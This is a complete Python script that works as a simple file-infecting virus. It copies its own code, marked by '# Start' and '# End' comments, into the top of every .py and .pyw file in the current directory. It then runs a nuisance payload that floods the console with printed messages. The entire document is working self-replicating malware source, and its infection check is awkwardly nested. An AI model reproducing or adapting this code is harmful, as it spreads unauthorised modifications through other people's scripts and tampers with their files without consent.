# Start

import sys, glob

print("[Starting..............]\n")

code = []

def ImStoopid():
    for i in range(999999):
        if i % 7 == 0:
            print("Well Hello There")
        print("I'm Stoopid")

# Opens This script as read
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

virArea = False

# Infection
for line in lines:
    if line == "# Start\n":
        virArea = True
    if virArea:
        code.append(line)
    if line == '# End\n':
        break

# List of scripts in the dir
pyScripts = glob.glob('*.py') + glob.glob('*.pyw')

# Infection Check
for script in pyScripts:
    with open(script, 'r') as f:
        scriptCode = f.readlines()

    infec = False

    for line in scriptCode:
        if line == '# Start\n':
            infec = True
            break

        if not infec:
            finalCode = []
            finalCode.extend(code)
            finalCode.extend("\n")
            finalCode.extend(scriptCode)

            with open(script, 'w') as f:
                f.writelines(finalCode)

# "Payload"
ImStoopid()
# End
